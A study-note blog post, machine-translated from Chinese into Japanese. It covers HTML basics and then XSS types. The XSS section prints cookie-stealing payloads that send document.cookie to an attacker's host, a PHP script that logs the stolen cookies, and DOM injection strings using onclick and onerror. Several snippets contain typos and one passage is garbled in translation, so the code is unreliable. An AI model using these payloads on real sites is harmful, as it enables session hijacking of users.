---
title: ウェブ攻撃
date: 2023-04-23 22:50:45
tags: ["code"]
lang: ja
slug: web-attack
---

> この記事は中国語から AI により機械翻訳されたものです。正確性については中国語の原文を参照してください。

# HTMLノート

## ヘッド

```html
<!doctype html>
<html>
    <head>
        <title>*****************</title>
    </head>
    <body>
        <h1>*********一级标题</h1>
        <h2>*********二级标题</h2>
        <!-- 以此类推 -->
        <!-- 这个是注释格式 -->
        <!-- 也可以这样 





-->
        <!-- 三种弹窗 -->
        <script>alert()</script>
        <script>confirm()</script>
        <script>prompt()</script>
        <!--  -->
        
        
        <p>这个是段落</p>
        <a herf="地址">这个是链接</a>	<!-- 引用地址 -->
        <img src="地址",width="**",height="**" /> <!-- 引用图片 -->
		
        <tr>
            <td>row1,cell1</td>
            <td>row1,cell2</td>
        </tr>
        <tr>
            <td>row2,cell1</td>
            <td>row2,cell2</td>
        </tr>
        <!-- 以上是表格格式 -->
<!--内嵌网页语法-->
        <iframe src="URL"></iframe>
        <!--设置高度宽度-->
        <iframe src="url" width="200" height="200"></iframe>
        <!--删除边框-->
        <iframe src="url" frameborder="0"></iframe>
        <!--可以跳转-->
        <iframe src="url" name=frame_></iframe>
        <p><a href="url" target="iframe_a">urlname</a></p>
        
```








# XSS

## 種類

- 反射型
- 格納型
- DOM型

## 反射型

永続的ではなく、単一のリンクのみをサポートする

## 格納型

攻撃対象サーバーに保存され、永続的

## DOM

バックエンドには送信されず、フロントエンドでdocumentオブジェクトを通じて情報を取得し、JSで結合して実行される

### Cookie

```shell
#cookie组成
Name=Value	设置cookie名称和值，作为认证cookie,value值包括web服务器所提供的访问令牌

Expires	设置cookie的生存期。有两种cookie:会话型与持久型。Expires缺省是为会话型cookie,仅保留在客户端内存，用户关闭浏览器时失效
持久型保存在用户硬盘，生存期到期或用户注销结束会话才会失效

Path	cookie所属u经，只有该路径及其下级目录可获取到该cookie

Domain	指定了可以访问该Cookie的Web站点或域，只有这个域或子域才能获取该cookie

Secure	表示该Cookie只可以使用https协议传输

HTTPOnly	设置HTTPOnly表示cookie不能被js读取，放置客户端通过document.cookie属性访问cookie

SameSite	定义cookie如何跨域发送
```

#### 3種類の攻撃方法

- リクエストで持ち出す

  VPSでリスニングを開始し、XSS脆弱性が存在するWebサイトにコードを挿入した後、ターゲットのCookie（base64_encode）を受信できる

  ```html
  #攻击后浏览器打开新窗口，访问指定ip：端口，带上cookie
  <script>windows.open('http://ip:port/?q='+btoa(document.cookie));</script>
  #攻击在当前窗口访问ip和端口
  <script>location.herf='http://ip:port/?q='+btoa(document.cookie);</script>
  ```

- 指定したURLにアクセスしてJSを実行する

  ```javascript
  #构造js
  var img = document.createElement("img");
  img.src = "http://ip:port/?q="+btoa(document.cookie);
  document.body.appendChild(img);
  
  #构造payload
  <script src=http://ip:port/js_location></script>
  ```

- XSSプラットフォームを利用する

  BLUE-LOTUS

  else……

---

```php+HTML
<?php
$filename ='cookies.txt';
$f = fopen($filename，'a'）
$cookie =urldecode($_GET['msg']) . PHP_EOL;
fwrite($f，$cookie);
fclose($f);
?>
```

 それはmsgパラメータの値をURLデコードしてから、cookies.txtというファイルに保存する。

   次に、HTTPリクエストを発行するJSコードを構築する。Imageオブジェクトを利用すればこのタスクを非常に簡単に完了できる。新しいImageオブジェクトを作成し、src属性を設定すると、ブラウザはsrc属性に遭遇したとき、そのsrcが指すURLを自動的にリクエストする。このURLには先ほど書いたCookieを受け取るページのURLを書き、msgパラメータを渡し、値はCookieにする。最終的に構築される文は次のとおり：

```php+HTML
<script>new Image().src="http://xss.com/recv_cookies.php?msg="+encodeURI(document.cookie);</script>
```

---

```php+HTML
function xssDom(){
var str = document.getElementById("msg").Value;
document.getElementById("show").innerHTML = "<a href="" + str + "'>xssDom</a>"
```

それに構文エラーがないようにするには、いくつかのタグを閉じる文を構築する必要がある。したがって、まずaタグのhref属性を閉じるためにシングルクォートが必要である。次に「>」でaタグの「<”。这样构造以后，就变成了“<a href=''>ここに悪用コードを構築する'>xssDom</a>」を閉じる。したがって、次のような文を構築できる：

   ` '><script>alert('xss');</script>`

W3Cは、innerHTMLで挿入されたscriptタグ内のスクリプトコードは実行できないと規定している。

scriptを直接挿入しても実行できないが、イベントを利用してトリガーできる。例えば、onerror、onclickなど。

次のようなデータを構築する：

`' onclick=alert(/xss/) //`

このとき、ページのコードは次のようになる：

`<a href='' onclick=alert(/xss/) //'>xssDom</a>`

ほかにも構築方法がある。例えば、aタグを閉じ、その後、別のタグ、たとえばimgタグを挿入する。imgタグがsrcを読み込むときにエラーが発生するとonerror関数がトリガーされることを利用すれば、インタラクションなしでスクリプトコードを自動実行できる。次のデータを入力してみる：

`    '><img src=123 onerror=alert(/xss/) />`

## ページ内ジャンプ

```xml
    页面内的跳转需要两步：

    方法一：

    ①：设置一个锚点链接<a href="#libai">我是李白</a>；（注意：href属性的属性值最前面要加#）

    ②：在页面中需要的位置设置锚点<a name="libai"></a>；（注意：a标签中要写一个name属性，属性值要与①中的href的属性值一样，不加#）标签中按需填写必要的文字，一般不写内容

    方法二：

    ①：同方法一的①

    ②：设置锚点的位置  <h3 id="libai">我是李白</h3>；在要跳转到的位置的标签中添加一个id属性，属性值与①中href的属性值一样，不加#

    方法二不用单独添加一个a标签来专门设置锚点 ，只在需要的位置的标签中添加一个id即可。
```